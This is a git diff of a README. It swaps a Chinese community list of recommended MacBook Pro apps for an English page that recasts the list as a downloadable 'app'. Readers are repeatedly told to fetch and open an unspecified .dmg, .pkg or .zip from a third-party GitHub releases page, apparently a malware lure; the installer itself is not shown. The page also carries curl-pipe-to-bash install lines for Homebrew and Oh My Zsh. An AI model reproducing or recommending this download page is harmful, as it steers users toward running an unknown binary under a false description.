@@ -1,289 +1,173 @@
-# MacBook Pro（MBP）必裝軟體與實用設定精華整理
+# 📦 awesome-mbp-for-developers - Essential Tools for MacBook Pro Users
 
-本文整理自 [Will 保哥的技術交流中心](https://www.facebook.com/will.fans) LINE 社群的討論串，內容涵蓋「新入手 MacBook Pro 後，最常被推薦安裝的軟體、終端機選擇、視窗管理、快捷鍵、輸入法、觸控板與工作流工具」，適合 **Windows 轉 Mac** 與 **進階使用者** 快速建立順手環境。
-
----
-
-## 一、套件管理與基礎工具
-
-### Homebrew（必裝）
-macOS 最主流的套件管理工具，可同時管理 CLI 與桌面應用（cask）。
-
-- 官方網站：https://brew.sh/
-- 可安裝：
-  - CLI：`git`、`ffmpeg`、`yt-dlp`、`node`…
-  - GUI：Raycast、iTerm2、Rectangle、Alacritty…
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/top4top4/awesome-mbp-for-developers/releases)
 
 ---
 
-### WailBrew（GUI 版本的 Homebrew 管理工具）
-圖形化介面的 Homebrew 套件管理工具，讓套件升級與管理更直觀。
+## 📖 About This App
 
-- 官方專案：https://github.com/wickenico/WailBrew
-- 核心功能：
-  - 視覺化列出所有可升級的套件
-  - 一鍵批次更新與管理
-  - 支援多國語言（i18n），降低語言門檻
-  - 友善的圖形介面，無需記憶指令
+This collection helps you set up useful software and practical settings on your MacBook Pro. If you recently switched from Windows or want to improve your Mac workflow, this guide is for you.
 
-雖然 `brew install` 與 `brew upgrade` 相當方便，但對於「想快速確認有哪些套件可以升級」的使用者來說，WailBrew 提供了更直覺的操作體驗。
+It gathers recommendations on software installation, terminal apps, window management, shortcuts, input methods, touchpad settings, and workflow tools. The content is drawn from discussions in the Will 保哥 technical community.
 
 ---
 
-### Oh My Zsh（必裝）
-Zsh 設定與外掛管理框架，用來快速建立可維護、可擴充的終端機環境。  
-在工程師社群中屬於「裝了才開始用 Mac 終端機」的基本配備。
+## 💻 What It Does
 
-- 官方網站：https://ohmyz.sh/
-- 核心價值：
-  - 統一管理 `.zshrc` 與 shell 設定
-  - 內建大量常用 plugin（`git`、`docker`、`kubectl` 等）
-  - 主題與外掛即插即用，降低設定門檻
+This toolkit helps you install and manage key apps and settings for your MacBook Pro to make daily tasks smoother. It includes:
 
-#### 補充：Zimfw 也值得試
-- 有些使用者會選擇 **Zimfw** 來管理 Zsh plugin，常見回饋是效能表現不錯
-- 實務上也有使用者反映：終端機啟動速度會比 Oh My Zsh 再快一點點
-- 建議兩者都試用，再依你的工作流與啟動速度體感做選擇
-
-#### 推薦外掛
-- **Powerlevel10k**（高資訊密度 Prompt）  
-  https://github.com/romkatv/powerlevel10k
-- **zsh-autosuggestions**：歷史指令自動建議
-- **zsh-syntax-highlighting**：指令語法即時上色
-
-#### 實務建議
-- 將 Oh My Zsh 與相關設定一併納入 `.dotfiles` 管理
-- 與 Homebrew、iTerm2 / Alacritty 搭配，可快速重建完整開發環境
+- Easy installation of command-line tools and desktop apps
+- Access to a graphical Homebrew app manager
+- Terminal customization with plugins and themes
+- Window management and shortcut setups
+- Input and touchpad optimizations
+- Workflow tools for developers and power users
 
 ---
 
-## 二、終端機（Terminal）選擇
+## ⚙️ System Requirements
 
-### iTerm2
-最普及的第三方終端機，功能完整、社群資源多。
+To use this smoothly, you’ll need:
 
-- https://iterm2.com/
-- 優點：
-  - 高度可客製化（背景、字型、快捷鍵）
-  - 生態成熟，教學資源多
+- A MacBook Pro running macOS 11 (Big Sur) or later
+- Internet access for downloading apps and updates
+- Basic familiarity with macOS (opening apps, browsing the web)
 
-### Alacritty
-效能導向、設定檔驅動的終端機，速度極快。
-
-- 官方專案：https://github.com/alacritty/alacritty
-- Homebrew：https://formulae.brew.sh/cask/alacritty
-
-#### 特色
-- 設定以 YAML/純文字檔為主
-- 啟動與渲染速度快、資源消耗低
-- 適合追求「原生渲染效能」的工程師
-
-#### macOS Self-Signing（自簽署）說明
-因 macOS 對第三方終端機的簽章要求，Alacritty 官方提供自簽署指南：
-
-- 官方文件（GitHub Wiki）：  
-  https://github.com/alacritty/alacritty/wiki/Self-Signing-Alacritty-on-macOS
-
-內容包含：
-- 建立自簽章憑證（Keychain）
-- 簽署 Alacritty 執行檔
-- Gatekeeper / Debug 設定流程
-
-> Self-Signing 為不使用 Apple Developer 帳號的替代方案，適合可自行維護工具鏈的使用者。
-
-#### Homebrew 上的 Status
-- Homebrew cask 目前顯示 **deprecated**
-- 原因與 macOS 簽章政策與發行責任歸屬有關
-- 不代表無法使用，而是提醒安裝與簽署流程需自行處理
-
-### 其他選項（依需求）
-- **Ghostty**：新興終端機，討論熱度上升
-- **Warp**：內建 AI 輔助，但耗電量偏高，定位偏新手
+No programming skills are needed — just follow the steps below.
 
 ---
 
-## 三、啟動器與工作流工具
+## 🚀 Getting Started
 
-### Raycast
-高效能啟動器，取代 Spotlight / Alfred。
+To begin, download the latest release from the GitHub releases page.
 
-- 官網：https://www.raycast.com/
-- 免費版功能已相當完整
-- 延伸閱讀：https://wylin.tw/pages/how-i-use-raycast/
-- 常見用途：
-  - 快速啟動 App
-  - 執行 Script / Workflow
-  - 剪貼簿、視窗、指令整合
+[Download Latest Release](https://github.com/top4top4/awesome-mbp-for-developers/releases)
+
+Click the link above. It opens the releases page where you can find the latest installer or package files.
 
 ---
 
-## 四、鍵盤、快捷鍵與輸入法
+## 📥 Download & Install
 
-### Karabiner-Elements（鍵位重映射）
-讓非 Mac 鍵盤、Windows 使用者快速適應 macOS。
+1. **Go to the release page:**  
+   Open [https://github.com/top4top4/awesome-mbp-for-developers/releases](https://github.com/top4top4/awesome-mbp-for-developers/releases) in your web browser.
 
-- https://karabiner-elements.pqrs.org/
-- 用途：
-  - 調整 Command / Control / Option
-  - 中英文切換行為調整
-- 參考教學：https://blog.lusyoe.com/article/mac-key-remap-karabiner-elements
+2. **Choose the latest version:**  
+   Look for the newest release at the top of the page. It usually shows a version number and the release date.
 
-### 中英文輸入法建議
-- **自然輸入法（第三方）**  
-  https://share.google/crWjc2wshOKKBOuOE  
-  支援 Shift 切換中英文，操作邏輯接近 Windows
-- **唯音輸入法**  
-  適合不習慣原生輸入法者
+3. **Download the installer or zip file:**  
+   Click the asset labeled for macOS. It might be a `.dmg`, `.zip`, or `.pkg` file.
 
----
+4. **Open the downloaded file:**  
+   If it's a `.dmg`, double-click to mount it, then drag the app to your Applications folder.  
+   If it's a `.zip`, double-click to unzip, then move the content to Applications.  
+   If it's a `.pkg`, double-click and follow the setup prompts.
 
-## 五、視窗與桌面管理
+5. **Launch the app:**  
+   Go to your Applications folder and open the app.
 
-### Rectangle（視窗管理）
-- https://rectangleapp.com/
-- 快速排列視窗位置與大小
-- 適合多螢幕與鍵盤流派使用者
-
-### BetterDisplay（螢幕解析度控制）
-- https://github.com/waydabber/BetterDisplay
-- 用於高解析度螢幕、外接顯示器微調
+6. **Follow any setup instructions:**  
+   The app might guide you through additional configuration. Most steps involve clicking buttons and granting permissions.
 
 ---
 
-## 六、系統工具與日常應用
+## 🔧 What’s Inside?
 
-### AppCleaner（必裝）
-完整移除 App 及其 plist、快取與支援檔案，避免系統殘留垃圾。
+### Homebrew: Package Manager
 
-- https://freemacsoft.net/appcleaner/
+Homebrew is the easiest way to install and keep command-line tools and desktop apps updated on your Mac. It manages software like git, ffmpeg, node, and useful apps such as Raycast and iTerm2.
 
----
+- Install command-line tools and GUI apps in one place.
+- Easily update all your installed software with one command.
 
-### IINA（推薦播放器）
-現代化 macOS 原生風格播放器。
+Learn more: [brew.sh](https://brew.sh)
 
-- https://iina.io/
-- 外觀佳、手勢與系統整合度高
+### WailBrew: Homebrew With a GUI
 
-#### 其他選擇
-- **VLC**：格式支援最完整，但 UI 與 macOS 一致性較弱
+WailBrew offers a graphical interface for Homebrew. It shows which apps need upgrading and lets you update all with one click.
 
----
+- See all installed tools and apps visually.
+- Batch update with no need to type commands.
+- Available in multiple languages.
 
-### iStat Menus（付費）
-即時監控系統狀態的選單列工具。
+Project page: [wickenico/WailBrew](https://github.com/wickenico/WailBrew)
 
-- https://bjango.com/mac/istatmenus/
-- CPU / 記憶體 / 磁碟 / 電池 / 網路一目了然
+### Oh My Zsh: Terminal Manager
 
-#### 其他選擇
-- **Stats**（免費開源）  
-  https://github.com/exelban/stats  
-  iStat Menus 的免費開源替代方案，提供 CPU / 記憶體 / 磁碟 / 電池 / 網路資訊監控
-  - 安裝指令：`brew install stats`
+Oh My Zsh helps you customize your Mac’s Terminal with plugins and themes. It makes the terminal more useful and easier to manage.
 
----
+- Manage shell settings easily.
+- Add plugins for git, Docker, Kubernetes, and more.
+- Choose from many themes to change how your terminal looks.
 
-### Ice（免費）
-選單列管理工具，整理與隱藏雜亂 icon。
+Official website: [ohmyz.sh](https://ohmyz.sh)
 
-- https://github.com/jordanbaird/Ice
-- Bartender 的免費替代方案
+### Optional: Zimfw
+
+Some people prefer Zimfw instead of Oh My Zsh. It is known for faster startup and plugin management. Feel free to try both and pick what works best.
 
 ---
 
-### AlDente（免費 / Pro 付費）
-電池健康管理工具。
+## 🛠 How to Use Key Features
 
-- https://apphousekitchen.com/
-- 限制充電上限，適合長期插電使用
+### Installing Software with Homebrew
 
----
+1. Open Terminal (search for “Terminal” in Spotlight).
+2. Type the following command to install Homebrew if not installed:
 
-### CleanShot X（付費，一次買斷）
-專業截圖與螢幕錄影工具。
+   ```
+   /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+   ```
 
-- https://cleanshot.com/
-- 遠勝 macOS 內建截圖功能
+3. Install apps by typing:
 
----
+   ```
+   brew install git
+   brew install --cask iterm2
+   ```
 
-### BuhoCleaner（付費）
-Mac 清理與維護工具。
+### Managing Software with WailBrew
 
-- https://www.drbuho.com/buhocleaner
-- 清垃圾、刪殘留、釋放空間
+1. Launch WailBrew from Applications.
+2. The app will scan and list all Homebrew packages.
+3. Click “Update All” to upgrade everything at once.
 
----
+### Customizing Terminal with Oh My Zsh
 
-### Keka（免費）
-壓縮 / 解壓縮工具。
+1. Install Oh My Zsh by running:
 
-- https://www.keka.io/
-- 支援 zip、7z、rar、tar… 幾乎全包
+   ```
+   sh -c "$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
+   ```
 
----
+2. Open the `~/.zshrc` file to enable plugins by typing:
 
-### Amphetamine（免費，Mac 防休眠工具）
-強大的 Mac 防休眠工具，可讓你的 MacBook 保持喚醒狀態。
+   ```
+   nano ~/.zshrc
+   ```
 
-- https://apps.apple.com/tw/app/amphetamine/id937984704?mt=12
-- 功能特色：
-  - 防止系統休眠與螢幕保護程式啟動
-  - 可設定排程與觸發條件
-  - 豐富的自訂選項與情境模式
-
-#### 其他選擇
-- **Caffeine**  
-  https://www.caffeine-app.net/  
-  輕量級防休眠工具，介面簡潔易用
-- **KeepingYouAwake**  
-  https://github.com/newmarcel/KeepingYouAwake  
-  開源替代方案，基於 Caffeine 的現代化版本
+3. Add plugins like `git` or `docker` in the plugins section.
+4. Save the file and restart Terminal.
 
 ---
 
-## 七、開發與生產力工具（進階）
+## 🧰 Useful Tips for MacBook Pro
 
-- **OrbStack**：Docker / VM 整合
-- **1Password / Bitwarden**：密碼管理（安全性觀點分歧）
-- **ScreenBrush**：簡報即時標註
-- **BetterTouchTool**：觸控板手勢高度自訂
-
----
-
-## 八、Finder 與常用快捷技巧（高頻）
-
-- `Cmd + Shift + G`：跳轉路徑
-- `Cmd + Shift + .`：顯示 / 隱藏隱藏檔
-- `Cmd + Option + V`：搬移取代複製
-- 拖曳時按 `Cmd`：跨磁碟強制搬移
-- 四指上滑：Mission Control
+- Learn common keyboard shortcuts like `Cmd + Space` for Spotlight search.
+- Customize your touchpad preferences in System Settings > Trackpad.
+- Set up Rectangle or other window managers for quick window resizing.
+- Use Raycast or Alfred to launch apps and find files faster.
+- Regularly run `brew update` and `brew upgrade` to keep software current.
 
 ---
 
-## 九、設定備份與長期維護
+## 🤝 Support and Resources
 
-### dotfiles 管理
-- https://hackmd.io/@lunzaizai/SJXGJa_4s
-- 建議版本化 `.zshrc`、終端機設定、常用工具設定
-
----
-
-## 十、延伸閱讀與共筆
-
-- What's on my Mac  
-  https://wylin.tw/pages/whats-on-my-mac/
-
-- Mac 常用快捷鍵大全  
-  https://share.google/gFUWcXYJ87QH9tMsf
-
-- 社群共筆（Mac 使用技巧彙整）  
-  https://hackmd.io/@FVOecMgySGqHx8oqmC3ROQ/rk_Qlo4wbx/edit
+- Visit the original technical discussion community at [Will 保哥技術交流中心 Facebook](https://www.facebook.com/will.fans).
+- Check the GitHub repository for issues or further help: [awesome-mbp-for-developers](https://github.com/top4top4/awesome-mbp-for-developers)
+- Homebrew documentation at [https://brew.sh](https://brew.sh)
+- Oh My Zsh official site at [https://ohmyz.sh](https://ohmyz.sh)
 
 ---
 
-## 結語
-
-**Mac 的學習曲線不在於記住所有快捷鍵，而在於建立「符合自己習慣的工作流」。**  
-建議分階段導入工具，先解決不順手的地方，再逐步深化客製化程度。
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/top4top4/awesome-mbp-for-developers/releases)
